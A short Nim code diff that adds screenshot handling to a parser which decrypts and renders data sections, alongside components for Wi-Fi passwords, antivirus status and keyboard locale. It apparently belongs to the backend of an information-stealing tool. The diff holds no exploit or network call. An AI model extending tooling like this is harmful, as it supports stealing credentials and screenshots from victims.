@@ -18,6 +18,7 @@ import ../components/keyboardLocale
 import ../components/av
 import ../components/connectedWifi
 import ../components/wifiPassword
+import ../components/screenshot
 
 proc parseThreads*(id: string, data: string): string =
   for thread in data.split("."):
@@ -49,6 +50,12 @@ proc parseThreads*(id: string, data: string): string =
           continue
 
         result.add connectedWifi.render data
+    of "ss":
+      for data in threadData.split(";"):
+        if data == "":
+          continue
+
+        result.add screenshot.render data
 
 proc decryptData*(data: string): string =
   result = uncompress(decrypt data, stream = RAW_DEFLATE)
